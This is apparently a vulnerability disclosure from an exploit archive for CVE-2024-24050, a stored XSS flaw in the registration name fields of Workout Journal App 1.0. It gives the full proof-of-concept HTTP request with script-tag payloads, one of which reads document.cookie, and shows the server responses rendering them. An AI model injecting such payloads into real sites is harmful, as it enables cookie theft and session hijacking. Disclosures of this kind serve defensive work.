@@ -1,0 +1,169 @@
+id: 39492
+date: 03/29/2024
+title: Workout Journal App 1.0 - Stored XSS Vulnerability
+author: MURAT CAGRI ALIS
+cves: CVE-2024-24050
+
+# Exploit Title: Workout Journal App 1.0 - Stored XSS
+# Exploit Author: MURAT CAGRI ALIS
+# Vendor Homepage: https://www.sourcecodester.com<https://www.sourcecodester.com/php/17088/workout-journal-app-using-php-and-mysql-source-code.html>
+# Software Link: https://www.sourcecodester.com/php/17088/workout-journal-app-using-php-and-mysql-source-code.html
+# Version: 1.0
+# Tested on: Windows / MacOS / Linux
+# CVE : CVE-2024-24050
+
+# Description
+
+Install and run the source code of the application on localhost. Register from the registration page at the url workout-journal/index.php. When registering, stored XSS payloads can be entered for the First and Last name on the page. When registering on this page, for the first_name parameter in the request to the /workout-journal/endpoint/add-user.php url
+For the last_name parameter, type " <script>console.log(document.cookie)</script> " and " <script>console.log(1337) </script> ". Then when you log in you will be redirected to /workout-journal/home.php. When you open the console here, you can see that Stored XSS is working. You can also see from the source code of the page that the payloads are working correctly. This vulnerability occurs when a user enters data without validation and then the browser is allowed to execute this code.
+
+
+# PoC
+
+Register Request to /workout-journal/endpoints/add-user.php
+
+POST /workout-journal/endpoint/add-user.php HTTP/1.1
+Host: localhost
+Content-Length: 268
+Cache-Control: max-age=0
+sec-ch-ua: "Chromium";v="121", "Not A(Brand";v="99"
+sec-ch-ua-mobile: ?0
+sec-ch-ua-platform: "Windows"
+Upgrade-Insecure-Requests: 1
+Origin: http://localhost
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: http://localhost/workout-journal/index.php
+Accept-Encoding: gzip, deflate, br
+Accept-Language: tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7
+Cookie: PHPSESSID=64s63vgqlnltujsrj64c5o0vci
+Connection: close
+
+first_name=%3Cscript%3Econsole.log%28document.cookie%29%3C%2Fscript%3E%29&last_name=%3Cscript%3Econsole.log%281337%29%3C%2Fscript%3E%29&weight=85&height=190&birthday=1991-11-20&contact_number=1234567890&email=test%40mail.mail&username=testusername&password=Test123456-
+
+This request turn back 200 Code on Response
+
+HTTP/1.1 200 OK
+Date: Sat, 16 Mar 2024 02:05:52 GMT
+Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/8.1.4
+X-Powered-By: PHP/8.1.4
+Content-Length: 214
+Connection: close
+Content-Type: text/html; charset=UTF-8
+
+
+                <script>
+                    alert('Account Registered Successfully!');
+                    window.location.href = 'http://localhost/workout-journal/';
+                </script>
+
+After these all, you can go to login page and login to system with username and password. After that you can see that on console payloads had worked right.
+
+/workout-journal/home.php Request
+
+GET /workout-journal/home.php HTTP/1.1
+Host: localhost
+sec-ch-ua: "Chromium";v="121", "Not A(Brand";v="99"
+sec-ch-ua-mobile: ?0
+sec-ch-ua-platform: "Windows"
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Dest: document
+Referer: http://localhost/workout-journal/endpoint/login.php
+Accept-Encoding: gzip, deflate, br
+Accept-Language: tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7
+Cookie: PHPSESSID=co1vmea8hr1nctjvmid87fa7d1
+Connection: close
+
+/workout-journal/home.php Response
+
+HTTP/1.1 200 OK
+Date: Sat, 16 Mar 2024 02:07:56 GMT
+Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/8.1.4
+X-Powered-By: PHP/8.1.4
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 2791
+Connection: close
+Content-Type: text/html; charset=UTF-8
+
+
+    <!DOCTYPE html>
+    <html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Workout Journal App</title>
+
+        <!-- Style CSS -->
+        <link rel="stylesheet" href="./assets/style.css">
+
+        <!-- Bootstrap CSS -->
+        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css">
+
+        <style>
+            body {
+                overflow: hidden;
+            }
+        </style>
+    </head>
+    <body>
+
+
+
+        <div class="main">
+            <nav class="navbar navbar-expand-lg navbar-dark bg-dark">
+                <a class="navbar-brand ml-3" href="#">Workout Journal App</a>
+                <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+                    <span class="navbar-toggler-icon"></span>
+                </button>
+
+                <div class="collapse navbar-collapse" id="navbarSupportedContent">
+                    <ul class="navbar-nav ml-auto">
+                    <li class="nav-item active">
+                        <a class="nav-link" href="./endpoint/logout.php">Log Out</a>
+                    </li>
+                </div>
+
+            </nav>
+
+            <div class="landing-page-container">
+                <div class="heading-container">
+                    <h2>Welcome <script>console.log(document.cookie);</script>) <script>console.log(1337);</script>)</h2>
+                    <p>What would you like to do today?</p>
+                </div>
+
+                <div class="select-option">
+                    <div class="read-journal" onclick="redirectToReadJournal()">
+                        <img src="./assets/read.jpg" alt="">
+                        <p>Read your past workout journals.</p>
+                    </div>
+                    <div class="write-journal" onclick="redirectToWriteJournal()">
+                        <img src="./assets/write.jpg" alt="">
+                        <p>Write your todays journal.</p>
+                    </div>
+                </div>
+            </div>
+
+        </div>
+
+        <!-- Bootstrap JS -->
+        <script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.slim.min.js"></script>
+        <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.1/dist/umd/popper.min.js"></script>
+        <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/js/bootstrap.min.js"></script>
+
+        <!-- Script JS -->
+        <script src="./assets/script.js"></script>
+    </body>
+    </html>
+
+#  0day.today [2024-04-02]  #
